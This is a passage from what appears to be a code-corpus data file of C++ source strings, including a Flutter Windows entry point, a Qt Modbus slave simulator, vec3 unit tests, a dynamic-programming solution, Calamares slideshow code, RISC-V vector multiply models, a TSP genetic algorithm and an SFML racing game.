+= forall_test<OpenMP>();\n#endif\n\n  failed += forall_3d_test<Sequential>();\n\n#ifdef PARTOOLS_USING_GPU\n  failed += forall_3d_test<GPU>();\n#endif\n\n#ifdef PARTOOLS_USING_OPENMP\n  failed += forall_3d_test<OpenMP>();\n#endif\n\n  return failed;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"GenPass\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"ModbusSlave.h\"\n#include <QRandomGenerator>\n\nModbusSlave::ModbusSlave(QObject *parent)\n    : QObject(parent)\n{\n    connect(&server,\n            &QModbusServer::dataWritten,\n            this,\n            [&](QModbusDataUnit::RegisterType table, int address, int size) {\n                if (table == QModbusDataUnit::HoldingRegisters && address == 1 && size == 1) {\n                    quint16 ledVal = 0;\n                    if (server.data(QModbusDataUnit::HoldingRegisters, 1, &ledVal)) {\n                        qDebug() << \"[Esclavo] LED escrito con valor:\" << ledVal;\n                    } else {\n                        emit errorOccurred(\"[Esclavo] No se pudo leer el LED del registro 1\");\n                    }\n                } else if (table == QModbusDataUnit::HoldingRegisters && address == 2 && size == 1) {\n                    quint16 thresholdVal = 0;\n                    if (server.data(QModbusDataUnit::HoldingRegisters, 2, &thresholdVal)) {\n                        setThreshold(thresholdVal);\n                        qDebug() << \"[Esclavo] Umbral configurado con valor:\" << thresholdVal;\n                    } else {\n                        emit errorOccurred(\"[Esclavo] No se pudo leer el registro del umbral 2\");\n                    }\n                }\n            });\n\n    connect(&tempTimer, &QTimer::timeout, this, [&]() {\n        int newTemp = 20 + QRandomGenerator::global()->bounded(15); // 20..34\n        server.setData(QModbusDataUnit::HoldingRegisters, 0, newTemp);\n        qDebug() << \"[Esclavo] Temperatura simulada =\" << newTemp << \"\u00b0C\";\n        emit temperatureUpdated(newTemp);\n    });\n}\n\nModbusSlave::~ModbusSlave()\n{\n    server.disconnectDevice();\n}\n\nbool ModbusSlave::initialize(const QString &port, int slaveId)\n{\n    server.setServerAddress(slaveId);\n\n    server.setConnectionParameter(QModbusDevice::SerialPortNameParameter, port);\n    server.setConnectionParameter(QModbusDevice::SerialBaudRateParameter, QSerialPort::Baud9600);\n    server.setConnectionParameter(QModbusDevice::SerialDataBitsParameter, QSerialPort::Data8);\n    server.setConnectionParameter(QModbusDevice::SerialParityParameter, QSerialPort::NoParity);\n    server.setConnectionParameter(QModbusDevice::SerialStopBitsParameter, QSerialPort::OneStop);\n\n    if (!server.connectDevice()) {\n        emit errorOccurred(\"No se pudo iniciar el esclavo RTU en el puerto: \" + port);\n        return false;\n    }\n\n    setupRegisters();\n\n    tempTimer.start(3000); // Actualiza temperatura\n\n    qDebug() << \"Esclavo Modbus RTU inicializado. Puerto:\" << port << \", slaveID:\" << slaveId;\n    return true;\n}\n\nvoid ModbusSlave::setupRegisters()\n{\n    QModbusDataUnitMap regMap;\n\n    // Configuraci\u00f3n de holding registers\n    QModbusDataUnit hrUnit(QModbusDataUnit::HoldingRegisters, 0, 10);\n    regMap.insert(QModbusDataUnit::HoldingRegisters, hrUnit);\n\n    // Configuraci\u00f3n de coils\n    QModbusDataUnit coilUnit(QModbusDataUnit::Coils, 0, 10); // Define un rango de 10 coils\n    regMap.insert(QModbusDataUnit::Coils, coilUnit);\n\n    if (!server.setMap(regMap)) {\n        emit errorOccurred(\"Error al configurar el mapa de registros en el servidor.\");\n        return;\n    }\n\n    // Valores iniciales para holding registers\n    server.setData(QModbusDataUnit::HoldingRegisters, 0, 25); // Temp. inicial\n    server.setData(QModbusDataUnit::HoldingRegisters, 1, 0);  // LED apagado\n    server.setData(QModbusDataUnit::HoldingRegisters, 2, 0);  // Umbral inicial\n\n    // Valores iniciales para coils\n    server.setData(QModbusDataUnit::Coils, 0, 0); // Coil 0: OFF\n    server.setData(QModbusDataUnit::Coils, 1, 1); // Coil 1: ON\n    server.setData(QModbusDataUnit::Coils, 2, 0); // Coil 2: OFF\n}\n\nvoid ModbusSlave::setThreshold(quint16 value)\n{\n    lastBinaryValue = value; // Store the binary value\n    qDebug() << \"[Esclavo] Umbral actualizado a:\" << value;\n}\n",
    "#include \"raytracing/vec3.h\"\n#include <cmath>\n#include <gtest/gtest.h>\n\nTEST(Vec3Test, DefaultConstructor) {\n  vec3 v;\n  EXPECT_DOUBLE_EQ(v.x(), 0.0);\n  EXPECT_DOUBLE_EQ(v.y(), 0.0);\n  EXPECT_DOUBLE_EQ(v.z(), 0.0);\n}\n\nTEST(Vec3Test, ParameterizedConstructor) {\n  vec3 v(1.0, 2.0, 3.0);\n  EXPECT_DOUBLE_EQ(v.x(), 1.0);\n  EXPECT_DOUBLE_EQ(v.y(), 2.0);\n  EXPECT_DOUBLE_EQ(v.z(), 3.0);\n}\n\nTEST(Vec3Test, NegationOperator) {\n  vec3 v(1.0, -2.0, 3.0);\n  vec3 negV = -v;\n  EXPECT_DOUBLE_EQ(negV.x(), -1.0);\n  EXPECT_DOUBLE_EQ(negV.y(), 2.0);\n  EXPECT_DOUBLE_EQ(negV.z(), -3.0);\n}\n\nTEST(Vec3Test, AdditionAssignmentOperator) {\n  vec3 v1(1.0, 2.0, 3.0);\n  vec3 v2(2.0, 2.0, 2.0);\n  v1 += v2;\n  EXPECT_DOUBLE_EQ(v1.x(), 3.0);\n  EXPECT_DOUBLE_EQ(v1.y(), 4.0);\n  EXPECT_DOUBLE_EQ(v1.z(), 5.0);\n}\n\nTEST(Vec3Test, MultiplyAssignmentOperator) {\n  vec3 v(1.0, 2.0, 3.0);\n  v *= 2.0;\n  EXPECT_DOUBLE_EQ(v.x(), 2.0);\n  EXPECT_DOUBLE_EQ(v.y(), 4.0);\n  EXPECT_DOUBLE_EQ(v.z(), 6.0);\n}\n\nTEST(Vec3Test, DivideAssignmentOperator) {\n  vec3 v(2.0, 4.0, 6.0);\n  v /= 2.0;\n  EXPECT_DOUBLE_EQ(v.x(), 1.0);\n  EXPECT_DOUBLE_EQ(v.y(), 2.0);\n  EXPECT_DOUBLE_EQ(v.z(), 3.0);\n}\n\nTEST(Vec3Test, Length) {\n  vec3 v(1.0, 2.0, 2.0);\n  EXPECT_DOUBLE_EQ(v.length(), 3.0);\n}\n\nTEST(Vec3Test, LengthSquared) {\n  vec3 v(1.0, 2.0, 2.0);\n  EXPECT_DOUBLE_EQ(v.length_squared(), 9.0);\n}\n\nTEST(Vec3Test, AdditionOperator) {\n  vec3 v1(1.0, 2.0, 3.0);\n  vec3 v2(2.0, 3.0, 4.0);\n  vec3 result = v1 + v2;\n  EXPECT_DOUBLE_EQ(result.x(), 3.0);\n  EXPECT_DOUBLE_EQ(result.y(), 5.0);\n  EXPECT_DOUBLE_EQ(result.z(), 7.0);\n}\n\nTEST(Vec3Test, SubtractionOperator) {\n  vec3 v1(1.0, 2.0, 3.0);\n  vec3 v2(2.0, 3.0, 4.0);\n  vec3 result = v1 - v2;\n  EXPECT_DOUBLE_EQ(result.x(), -1.0);\n  EXPECT_DOUBLE_EQ(result.y(), -1.0);\n  EXPECT_DOUBLE_EQ(result.z(), -1.0);\n}\n\nTEST(Vec3Test, MultiplicationOperatorVec3) {\n  vec3 v1(1.0, 2.0, 3.0);\n  vec3 v2(2.0, 3.0, 4.0);\n  vec3 result = v1 * v2;\n  EXPECT_DOUBLE_EQ(result.x(), 2.0);\n  EXPECT_DOUBLE_EQ(result.y(), 6.0);\n  EXPECT_DOUBLE_EQ(result.z(), 12.0);\n}\n\nTEST(Vec3Test, MultiplicationOperatorScalar) {\n  vec3 v(1.0, 2.0, 3.0);\n  vec3 result1 = 2.0 * v;\n  vec3 result2 = v * 3.0;\n  EXPECT_DOUBLE_EQ(result1.x(), 2.0);\n  EXPECT_DOUBLE_EQ(result1.y(), 4.0);\n  EXPECT_DOUBLE_EQ(result1.z(), 6.0);\n  EXPECT_DOUBLE_EQ(result2.x(), 3.0);\n  EXPECT_DOUBLE_EQ(result2.y(), 6.0);\n  EXPECT_DOUBLE_EQ(result2.z(), 9.0);\n}\n\nTEST(Vec3Test, DivisionOperatorScalar) {\n  vec3 v(2.0, 4.0, 6.0);\n  vec3 result = v / 2.0;\n  EXPECT_DOUBLE_EQ(result.x(), 1.0);\n  EXPECT_DOUBLE_EQ(result.y(), 2.0);\n  EXPECT_DOUBLE_EQ(result.z(), 3.0);\n}\n\nTEST(Vec3Test, DotProduct) {\n  vec3 v1(1.0, 2.0, 3.0);\n  vec3 v2(4.0, -5.0, 6.0);\n  double result = dot(v1, v2);\n  EXPECT_DOUBLE_EQ(result, (1.0 * 4.0) + (2.0 * -5.0) + (3.0 * 6.0));\n  EXPECT_DOUBLE_EQ(result, 4.0 - 10.0 + 18.0);\n}\n\nTEST(Vec3Test, CrossProduct) {\n  vec3 v1(1.0, 2.0, 3.0);\n  vec3 v2(2.0, 3.0, 4.0);\n  vec3 result = cross(v1, v2);\n  // cross(1,2,3),(2,3,4) = (2*4 - 3*3, 3*2 - 1*4, 1*3 - 2*2)\n  //                      = (8 - 9, 6 - 4, 3 - 4) = (-1, 2, -1)\n  EXPECT_DOUBLE_EQ(result.x(), -1.0);\n  EXPECT_DOUBLE_EQ(result.y(), 2.0);\n  EXPECT_DOUBLE_EQ(result.z(), -1.0);\n}\n\nTEST(Vec3Test, UnitVector) {\n  vec3 v(1.0, 2.0, 2.0);\n  vec3 unitV = unit_vector(v);\n  double len = std::sqrt(1.0 + 4.0 + 4.0); // 3.0\n  EXPECT_DOUBLE_EQ(unitV.x(), 1.0 / len);\n  EXPECT_DOUBLE_EQ(unitV.y(), 2.0 / len);\n  EXPECT_DOUBLE_EQ(unitV.z(), 2.0 / len);\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\ntypedef long long ll;\ntypedef unsigned long long ull;\ntypedef long double lld;\nconst long long mod = 1e8;\n#define INF (1LL << 60)\n#define inf (1 << 30)\n#define all(x) (x).begin(), (x).end()\n\n#ifndef ONLINE_JUDGE\n#define debug(x) cerr << #x << \" \"; _print(x); cerr << endl;\n#else\n#define debug(x)\n#endif\n\nvoid _print(ll t) { cerr << t; }\nvoid _print(int t) { cerr << t; }\nvoid _print(string t) { cerr << t; }\nvoid _print(char t) { cerr << t; }\nvoid _print(lld t) { cerr << t; }\nvoid _print(double t) { cerr << t; }\nvoid _print(ull t) { cerr << t; }\n\ntemplate <class T, class V> void _print(pair <T, V> p);\ntemplate <class T> void _print(vector <T> v);\ntemplate <class T> void _print(set <T> v);\n\ntemplate <class T, class V> void _print(map <T, V> v);\ntemplate <class T> void _print(multiset <T> v);\n\ntemplate <class T, class V> void _print(pair <T, V> p) {\n    cerr << \"{\"; _print(p.first); cerr << \",\"; _print(p.second); cerr << \"}\";\n}\ntemplate <class T> void _print(vector <T> v) {\n    cerr << \"[ \"; for (T i : v) {_print(i); cerr << \" \";} cerr << \"]\";\n}\ntemplate <class T> void _print(set <T> v) {\n    cerr << \"[ \"; for (T i : v) {_print(i); cerr << \" \";} cerr << \"]\";\n}\ntemplate <class T> void _print(multiset <T> v) {\n    cerr << \"[ \"; for (T i : v) {_print(i); cerr << \" \";} cerr << \"]\";\n}\ntemplate <class T, class V> void _print(map <T, V> v) {\n    cerr << \"[ \"; for (auto i : v) {_print(i); cerr << \" \";} cerr << \"]\";\n}\nint dp[101][101][11][11];\nint dfs(int n1,int n2,int k1,int k2,int prev_k,int prev_h){\n    if(n1==0 && n2==0)return 1;\n    if(dp[n1][n2][prev_k][prev_h]!=-1)return dp[n1][n2][prev_k][prev_h];\n    ///place footmen\n    int ans=0;\n    int op1= prev_k+1 <= k1 && n1>0 ? dfs(n1-1,n2,k1,k2,prev_k+1,0):0;\n    int op2= prev_h+1 <= k2 && n2>0 ? dfs(n1,n2-1,k1,k2,0,prev_h+1):0;\n    ans=(ans+op1+op2)%mod;\n    // if(prev_k+1 <=k1 && n1>0){\n    //     ans=(ans+dfs(n1-1,n2,k1,k2,prev_k+1,0))%mod;\n    // }\n    // if(prev_h+1 <=k2 && n2>0){\n    //     ans=(ans+dfs(n1,n2-1,k1,k2,0,prev_h+1))%mod;\n    // }\n    return dp[n1][n2][prev_k][prev_h]=ans;\n}\n\n\nvoid solve(){\n    int n1,n2,k1,k2;\n    cin>>n1>>n2>>k1>>k2;\n    memset(dp,-1,sizeof(dp));\n    int ans=dfs(n1,n2,k1,k2,0,0);\n    cout<<ans<<\"\\n\";\n}\n\nint main() {\n    #ifndef ONLINE_JUDGE\n        freopen(\"Error.txt\", \"w\", stderr);\n    #endif\n    ios::sync_with_stdio(false);cin.tie(nullptr);cout.tie(nullptr);\n    int test=1;\n    // cin>>test;\n    while(test--){\n         solve();\n    }\n    \n    return 0;\n}\n",
    "/* === This file is part of Calamares - <https://calamares.io> ===\n *\n *   SPDX-FileCopyrightText: 2014 Aur\u00e9lien G\u00e2teau <agateau@kde.org>\n *   SPDX-FileCopyrightText: 2014-2015 Teo Mrnjavac <teo@kde.org>\n *   SPDX-FileCopyrightText: 2018 Adriaan de Groot <groot@kde.org>\n *   SPDX-License-Identifier: GPL-3.0-or-later\n *\n *   Calamares is Free Software: see the License-Identifier above.\n *\n */\n\n#include \"Slideshow.h\"\n\n#include \"Branding.h\"\n#include \"compat/Mutex.h\"\n#include \"compat/Variant.h\"\n#include \"utils/Dirs.h\"\n#include \"utils/Logger.h\"\n#ifdef WITH_QML\n#include \"utils/Qml.h\"\n#endif\n#include \"utils/Retranslator.h\"\n\n#include <QLabel>\n#include <QMutexLocker>\n#ifdef WITH_QML\n#include <QQmlComponent>\n#include <QQmlEngine>\n#include <QQuickItem>\n#include <QQuickWidget>\n#endif\n#include <QTimer>\n\n#include <chrono>\n\nnamespace Calamares\n{\n\nSlideshow::~Slideshow() {}\n\n#ifdef WITH_QML\nSlideshowQML::SlideshowQML( QWidget* parent )\n    : Slideshow( parent )\n    , m_qmlShow( new QQuickWidget )\n    , m_qmlComponent( nullptr )\n    , m_qmlObject( nullptr )\n{\n    m_qmlShow->setObjectName( \"qml\" );\n\n    Calamares::registerQmlModels();\n\n    m_qmlShow->setSizePolicy( QSizePolicy::Expanding, QSizePolicy::Expanding );\n    m_qmlShow->setResizeMode( QQuickWidget::SizeRootObjectToView );\n    m_qmlShow->engine()->addImportPath( Calamares::qmlModulesDir().absolutePath() );\n\n    cDebug() << \"QML import paths:\" << Logger::DebugList( m_qmlShow->engine()->importPathList() );\n    CALAMARES_RETRANSLATE( if ( m_qmlShow ) { m_qmlShow->engine()->retranslate(); } );\n\n    if ( Branding::instance()->slideshowAPI() == 2 )\n    {\n        cDebug() << \"QML load on startup, API 2.\";\n        loadQmlV2();\n    }\n}\n\nSlideshowQML::~SlideshowQML()\n{\n    delete m_qmlObject;\n    delete m_qmlComponent;\n    delete m_qmlShow;\n}\n\nQWidget*\nSlideshowQML::widget()\n{\n    return m_qmlShow;\n}\n\nvoid\nSlideshowQML::loadQmlV2()\n{\n    Calamares::MutexLocker l( &m_mutex );\n    if ( !m_qmlComponent && !Calamares::Branding::instance()->slideshowPath().isEmpty() )\n    {\n        m_qmlComponent = new QQmlComponent( m_qmlShow->engine(),\n                                            QUrl::fromLocalFile( Calamares::Branding::instance()->slideshowPath() ),\n                                            QQmlComponent::CompilationMode::Asynchronous );\n        connect( m_qmlComponent, &QQmlComponent::statusChanged, this, &SlideshowQML::loadQmlV2Complete );\n    }\n}\n\nvoid\nSlideshowQML::loadQmlV2Complete()\n{\n    Calamares::MutexLocker l( &m_mutex );\n    if ( m_qmlComponent && m_qmlComponent->isReady() && !m_qmlObject )\n    {\n        cDebug() << \"QML component complete, API 2\";\n        // Don't do this again\n        disconnect( m_qmlComponent, &QQmlComponent::statusChanged, this, &SlideshowQML::loadQmlV2Complete );\n\n        QObject* o = m_qmlComponent->create();\n        m_qmlObject = qobject_cast< QQuickItem* >( o );\n        if ( !m_qmlObject )\n        {\n            delete o;\n        }\n        else\n        {\n            cDebug() << Logger::SubEntry << \"Loading\" << Calamares::Branding::instance()->slideshowPath();\n\n            // setContent() is public API, but not documented publicly.\n            // It is marked \\internal in the Qt sources, but does exactly\n            // what is needed: sets up visual parent by replacing the root\n            // item, and handling resizes.\n            m_qmlShow->setContent(\n                QUrl::fromLocalFile( Calamares::Branding::instance()->slideshowPath() ), m_qmlComponent, m_qmlObject );\n            if ( isActive() )\n            {\n                // We're alreay visible! Must have been slow QML loading, and we\n                // passed onActivate already. changeSlideShowState() locks\n                // the same mutex: call changeSlideShowState() after l is dead.\n                QTimer::singleShot( 0, this, &SlideshowQML::startSlideShow );\n            }\n        }\n    }\n    else\n    {\n        if ( m_qmlObject )\n        {\n            cWarning() << \"QML object already created\";\n        }\n        else if ( !m_qmlComponent )\n        {\n            cWarning() << \"QML component does not exist\";\n        }\n        else if ( m_qmlComponent && !m_qmlComponent->isReady() )\n        {\n            cWarning() << \"QML component not ready:\" << m_qmlComponent->errors();\n        }\n    }\n}\n\nvoid\nSlideshowQML::startSlideShow()\n{\n    changeSlideShowState( Slideshow::Start );\n}\n\n/*\n * Applies V1 and V2 QML activation / deactivation:\n *  - V1 loads the QML in @p widget on activation. Sets root object property\n *    *activatedInCalamares* as appropriate.\n *  - V2 calls onActivate() or onLeave() in the QML as appropriate. Also\n *    sets the *activatedInCalamares* property.\n */\nvoid\nSlideshowQML::changeSlideShowState( Action state )\n{\n    Calamares::MutexLocker l( &m_mutex );\n    bool activate = state == Slideshow::Start;\n\n    if ( Branding::instance()->slideshowAPI() == 2 )\n    {\n        // The QML was already loaded in the constructor, need to start it\n        Calamares::callQmlFuncti",
    "#include \"Hector.h\"\n#include <stdio.h>\n#include <math.h>\n#include <ac_int.h>\n#include <rac.h>\n#include <arith.h>\n#include <string>\n#include <vector>\nusing namespace std;\n\n// RAC begin\n\ntypedef ac_int<2, false> ui2;\ntypedef ac_int<3, false> ui3;\ntypedef ac_int<4, false> ui4;\ntypedef ac_int<5, false> ui5;\ntypedef ac_int<6, false> ui6;\ntypedef ac_int<7, false> ui7;\ntypedef ac_int<8, false> ui8;\ntypedef ac_int<16, false> ui16;\ntypedef ac_int<32, false> ui32;\ntypedef ac_int<64, false> ui64;\ntypedef ac_int<128, false> ui128;\ntypedef ac_int<5, true> si5;\ntypedef ac_int<8, true> si8;\ntypedef ac_int<16, true> si16;\ntypedef ac_int<32, true> si32;\ntypedef ac_int<64, true> si64;\ntypedef ac_int<128, true> si128;\n\n//vwmul_vv\nui128 rv_vwmul_vv(ui128 vs1, ui128 vs2, ui128 vm, ui128 oldvd, ui7 vstart, ui8 vl, ui3 vsew, bool vma, bool vta, bool Mask) {\n  ui128 vd = 0;\n  if (vsew == 0x0) {\n     ui8 vs1_arr, vs2_arr;\n     ui16 vs1_arrext, vs2_arrext, oldvd_arr, vd_arr;\n     for (uint i = 0; i < 8; i++) {\n        vs1_arr = vs1.slc<8>(i*8);\n        if(vs1.slc<1>((i+1)*8-1)){\n          vs1_arrext = 0xFF00|vs1_arr;\n        }else{\n          vs1_arrext = 0x0000|vs1_arr;\n        }\n        vs2_arr = vs2.slc<8>(i*8);\n        if(vs2.slc<1>((i+1)*8-1)){\n          vs2_arrext = 0xFF00|vs2_arr;\n        }else{\n          vs2_arrext = 0x0000|vs2_arr;\n        }\n        oldvd_arr = oldvd.slc<16>(i*16);\n        if ((i >= vstart) && (i < vl)) {\n           if ((Mask == 1) && (vm[i] == 0)) {\n              if (vma) {\n                 vd_arr  = ui16(0xFFFF);\n              } else {\n                 vd_arr  = oldvd_arr;\n              }\n           } else {\n              vd_arr  = vs1_arrext * vs2_arrext;\n           }\n           vd.set_slc(i*16,vd_arr);\n        } else if ((i < vstart) || ((i >= vl) && (vta == 0)) || (vstart >= vl)) {\n           vd.set_slc(i*16,oldvd_arr);\n        } else {\n           vd.set_slc(i*16,ui16(0xFFFF));\n        }\n     }\n  }\n  if (vsew == 0x1) {\n     ui16 vs1_arr, vs2_arr;\n     ui32 vs1_arrext, vs2_arrext, oldvd_arr, vd_arr;\n     for (uint i = 0; i < 4; i++) {\n        vs1_arr = vs1.slc<16>(i*16);\n        if(vs1.slc<1>((i+1)*16-1)){\n          vs1_arrext = 0xFFFF0000|vs1_arr;\n        }else{\n          vs1_arrext = 0x00000000|vs1_arr;\n        }\n        vs2_arr = vs2.slc<16>(i*16);\n        if(vs2.slc<1>((i+1)*16-1)){\n          vs2_arrext = 0xFFFF0000|vs2_arr;\n        }else{\n          vs2_arrext = 0x00000000|vs2_arr;\n        }\n        oldvd_arr = oldvd.slc<32>(i*32);\n        if ((i >= vstart) && (i < vl)) {\n           if ((Mask == 1) && (vm[i] == 0)) {\n              if (vma) {\n                 vd_arr  = ui32(0xFFFFFFFF);\n              } else {\n                 vd_arr  = oldvd_arr;\n              }\n           } else {\n              vd_arr  = vs1_arrext * vs2_arrext;\n           }\n           vd.set_slc(i*32,vd_arr);\n        } else if ((i < vstart) || ((i >= vl) && (vta == 0)) || (vstart >= vl)) {\n           vd.set_slc(i*32,oldvd_arr);\n        } else {\n           vd.set_slc(i*32,ui32(0xFFFFFFFF));\n        }\n     }\n  }\n  if (vsew == 0x2) {\n     ui32 vs1_arr, vs2_arr;\n     ui64 vs1_arrext, vs2_arrext, oldvd_arr, vd_arr;\n     for (uint i = 0; i < 2; i++) {\n        vs1_arr = vs1.slc<32>(i*32);\n        if(vs1.slc<1>((i+1)*32-1)){\n          vs1_arrext = 0xFFFFFFFF00000000|vs1_arr;\n        }else{\n          vs1_arrext = 0x0000000000000000|vs1_arr;\n        }\n        vs2_arr = vs2.slc<32>(i*32);\n        if(vs2.slc<1>((i+1)*32-1)){\n          vs2_arrext = 0xFFFFFFFF00000000|vs2_arr;\n        }else{\n          vs2_arrext = 0x0000000000000000|vs2_arr;\n        }\n        oldvd_arr = oldvd.slc<64>(i*64);\n        if ((i >= vstart) && (i < vl)) {\n           if ((Mask == 1) && (vm[i] == 0)) {\n              if (vma) {\n                 vd_arr  = ui64(0xFFFFFFFFFFFFFFFF);\n              } else {\n                 vd_arr  = oldvd_arr;\n              }\n           } else {\n              vd_arr  = vs1_arrext * vs2_arrext;\n           }\n           vd.set_slc(i*64,vd_arr);\n        } else if ((i < vstart) || ((i >= vl) && (vta == 0)) || (vstart >= vl)) {\n           vd.set_slc(i*64,oldvd_arr);\n        } else {\n           vd.set_slc(i*64,ui64(0xFFFFFFFFFFFFFFFF));\n        }\n     }\n  }\n  return vd;\n}\n\n//vwmul_vx\nui128 rv_vwmul_vx(ui128 vs1, ui128 vs2, ui128 vm, ui128 oldvd, ui7 vstart, ui8 vl, ui3 vsew, bool vma, bool vta, bool Mask) {\n  ui128 vd = 0;\n  if (vsew == 0x0) {\n     ui8 vs1_arr, vs2_arr;\n     ui16 vs1_arrext, vs2_arrext, oldvd_arr, vd_arr;\n     for (uint i = 0; i < 8; i++) {\n        vs1_arr = vs1.slc<8>(0);\n        if(vs1.slc<1>(7)){\n          vs1_arrext = 0xFF00|vs1_arr;\n        }else{\n          vs1_arrext = 0x0000|vs1_arr;\n        }\n        vs2_arr = vs2.slc<8>(i*8);\n        if(vs2.slc<1>((i+1)*8-1)){\n          vs2_arrext = 0xFF00|vs2_arr;\n        }else{\n          vs2_arrext = 0x0000|vs2_arr;\n        }\n        oldvd_arr = oldvd.slc<16>(i*16);\n        if ((i >= vstart) && (i < vl)) {\n           if ((Mask == 1) && (vm[i] == 0)) {\n              if (vma) {\n             ",
    "#include \"InverOver.h\"\n\n#include <iostream>\n#include <vector>\n#include <string>\n#include <algorithm>\n#include <random>\n#include <cmath>\n#include <fstream>\n\nusing namespace std;\n\nInverOver::InverOver() {\n\n}\n\nInverOver::InverOver(TSPProblem& tspProblem, int populationSize) : GeneticAlgorithm(tspProblem, populationSize, nullptr, nullptr, nullptr) {\n\t// Initialise vectors to reduce memory allocation\n\tcurrSol.reserve(dimension);\n\torder.reserve(dimension);\n\n\tfor (int i = 0; i < tspProblem.dimension; i++) {\n\t\tcurrSol.push_back(City());\n\t\torder.push_back(i);\n\t}\n}\n\nvoid InverOver::invert(size_t indexA, size_t indexB, std::vector<City>& solution) {\n\t// sort indexes\n\tif (indexB < indexA) {\n\t\tswap(indexA, indexB);\n\t}\n\t// Reverse segment\n\tstd::reverse(solution.begin() + indexA + 1, solution.begin() + indexB + 1);\n}\n\n\n/*\n * Inverover iterates over each invdividual, finds two random cities, and reverses the segment\n * at end between the cities. If the reversed segment is beneficial, the solution is kept, otherwise,\n * the individual is untouched\n */\nvoid InverOver::runGeneration() {\n\tstats.updateGen();\n\t// Init random distributions\n\trandom_device rd;\n\tdefault_random_engine eng(rd());\n\tuniform_real_distribution<float> distrFloat(0.0, 1.0);\n\tuniform_int_distribution<int> distrDimension(0, dimension - 1);\n\tuniform_int_distribution<int> distrPop(0, populationSize - 1);\n\t// For each individual\n\tfor (int k = 0; k < populationSize; k++) {\n\t\t// Copy individual solution\n\t\tfor (int i = 0; i < dimension; i++) {\n\t\t\tcurrSol[i] = population->population[k].route[i];\n\t\t}\n\t\t// Shuffle order of indexes to visit\n\t\tmt19937 g(rd());\n\t\tshuffle(order.begin(), order.end(), g);\n\n\t\tfor (int j = 0; j < dimension; j++) {\n\t\t\tmt19937 eng(rd());\n\t\t\tsize_t i = order[j];\n\t\t\tCity* cityA = &currSol[i];\n\t\t\tCity* cityB;\n\t\t\tsize_t indexB = -1000;\n\t\t\t// If 2% chance, assign CityB to random city that is not cityA\n\t\t\tif (distrFloat(eng) < 0.02f) {\n\t\t\t\t// Get random index thats not i\n\t\t\t\tint randIndex = i;\n\t\t\t\twhile (randIndex == i) \n\t\t\t\t\trandIndex = distrDimension(eng);\n\t\t\t\t// Assign cityB to randomly found city\n\t\t\t\tcityB = &currSol[randIndex];\n\t\t\t\tindexB = randIndex;\n\t\t\t} \n\t\t\t// If 98% chance, assign cityB the index in another individual\n\t\t\telse {\n\t\t\t\t// Select another individual\n\t\t\t\tint randIndex = k;\n\t\t\t\twhile (randIndex == k) \n\t\t\t\t\trandIndex = distrPop(eng);\n\t\t\t\tIndividual* anotherIndividual = &population->population[randIndex];\n\t\t\t\t// Find index of cityA in other individual\n\t\t\t\tsize_t anotherCityAIndex = anotherIndividual->index(cityA);\n\t\t\t\t// CityB is proceeding city in other individual\n\t\t\t\tcityB = &anotherIndividual->route[(anotherCityAIndex + 1) % dimension];\n\t\t\t}\n\t\t\t// If cityB is either pevious or next, iterate to next city\n\t\t\tCity* previousCity = &currSol[(i - 1) % dimension];\n\t\t\tCity* nextCity = &currSol[(i + 1) % dimension];\n\n\t\t\tif (cityB->index == previousCity->index || cityB->index == nextCity->index) \n\t\t\t\tbreak;\n\t\t\t// Find index of cityB\n\t\t\tfor (int v = 0; v < dimension; v++) {\n\t\t\t\tif (currSol[v].index == cityB->index) {\n\t\t\t\t\tindexB = v;\n\t\t\t\t}\n\t\t\t}\n\t\t\t// Reverse segment at and between cityA and cityB\n\t\t\tinvert(i, indexB, currSol);\n\t\t}\n\t\t// Recalculate fitness of individual\n\t\tfloat currFitness = Individual::calculateFitness(currSol);\n\t\t// If found solution is better than current individual fitness, replace individual's solution\n\t\tif (currFitness < population->population[k].fitness) {\n\t\t\tfor (int i = 0; i < dimension; i++) {\n\t\t\t\tpopulation->population[k].route[i] = currSol[i];\n\t\t\t}\n\t\t\tpopulation->population[k].fitness = currFitness;\n\t\t\tstats.update(currSol, currFitness);\n\t\t}\n\t}\n\n\t// Recalculate all fitnesses\n\tpopulation->calculateAllFitness();\n}\n",
    "#include <SFML/Graphics.hpp>\nusing namespace sf;\n\nconst int num = 8; //check points\nint points[num][2] = { 300, 610,\n\t\t\t\t\t  1270,430,\n\t\t\t\t\t  1380,2380,\n\t\t\t\t\t  1900,2460,\n\t\t\t\t\t  1970,1700,\n\t\t\t\t\t  2550,1680,\n\t\t\t\t\t  2560,3150,\n\t\t\t\t\t  500, 3300 };\n\n//Car \uad6c\uc870\uccb4 \uc0dd\uc131\nstruct Car\n{\n\t// \uba64\ubc84: x, y\uc88c\ud45c, \uc18d\ub3c4, \uac01\ub3c4, n(check point)\n\tfloat x, y, speed, angle; int n;\n\n\t//\uad6c\uc870\uccb4 \ucd08\uae30\ud654(\uc0dd\uc131\uc790)\n\tCar() { speed = 2; angle = 0; n = 0; } \n\n\t//\uad6c\uc870\uccb4 \ud568\uc218\n\tvoid move() //\uc774\ub3d9\n\t{\n\t\tx += sin(angle) * speed; //x\uc88c\ud45c \uc774\ub3d9\n\t\ty -= cos(angle) * speed; //y\uc88c\ud45c \uc774\ub3d9\n\t}\n\n\tvoid findTarget()  //\uc704\uce58\ub97c \ucc3e\uc74c\n\t{\n\t\tfloat tx = 